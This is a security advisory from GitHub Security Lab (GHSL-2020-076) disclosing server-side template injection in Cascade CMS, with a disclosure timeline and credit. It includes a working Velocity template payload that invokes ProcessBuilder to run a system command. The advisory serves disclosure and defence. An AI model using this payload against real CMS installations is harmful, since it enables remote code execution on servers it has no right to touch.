<header class="post-header d-block mb-6">
      <div class="date text-mono f5 my-3">August 19, 2020</div>
      <h1 class="my-2 h00-mktg lh-condensed">GHSL-2020-076: Server-Side Template Injection in Cascade CMS</h1>

      
      
      
      
      

      

      <a target="_blank" class="sc-frDJqD SgxRc d-inline-flex flex-row flex-items-center text-gray" href="https://github.com/pwntester">
        <img class="mr-3" src="https://avatars.githubusercontent.com/u/125701?s=35" height="35" width="35">
        <span>Alvaro Munoz</span>
      </a>
    </header>

    <main id="content" class="markdown-body" aria-label="Content">
      <h2 id="summary">Summary</h2>

<p>A user with privileges to edit templates may execute arbitrary Java code or run arbitrary system commands with the same privileges as the account running Cascade CMS.</p>

<h2 id="product">Product</h2>

<p>Cascade CMS</p>

<h2 id="tested-version">Tested Version</h2>

<p>Cascade CMS v8.14.cloud5 (57164371131571924e45d18fbd2725f3d8d124d4)</p>

<h2 id="details">Details</h2>

<h3 id="server-side-template-injection-velocity">Server-Side Template Injection (Velocity)</h3>

<p>Cascade CMS does not use the Velocity SecureUberspector, which allows attackers that are able to modify or create templates to execute arbitrary Java code and achieve remote code execution. For example the following template will run the system <code class="language-plaintext highlighter-rouge">id</code> command:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>##### $scriptEngine = $currentPage.class.forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('js') )
${scriptEngine.eval("var x=new java.lang.ProcessBuilder('id'); org.apache.commons.io.IOUtils.toString(x.start().getInputStream())")}
</code></pre></div></div>

<p>In addition, Cascade CMS exposes Velocity <code class="language-plaintext highlighter-rouge">FieldTool</code> through the <code class="language-plaintext highlighter-rouge">$_FieldTool</code> variable. This tool allows accessing any public static field on any class reachable by the Velocity ClassLoader.</p>

<h3 id="impact">Impact</h3>

<p>This issue may lead to <code class="language-plaintext highlighter-rouge">Remote Code Execution</code>.</p>

<h2 id="coordinated-disclosure-timeline">Coordinated Disclosure Timeline</h2>
<ul>
  <li>04/17/2020: Sent report to vendor.</li>
  <li>04/17/2020: Vendor acknowledges the issue.</li>
  <li>04/27/2020: Issue is fixed.</li>
</ul>

<h2 id="credit">Credit</h2>

<p>This issue was discovered and reported by GHSL team member <a href="https://github.com/pwntester">@pwntester (Alvaro Munoz)</a>.</p>

<h2 id="contact">Contact</h2>

<p>You can contact the GHSL team at <code class="language-plaintext highlighter-rouge">securitylab@github.com</code>, please include the <code class="language-plaintext highlighter-rouge">GHSL-2020-076</code> in any communication regarding this issue.</p>

    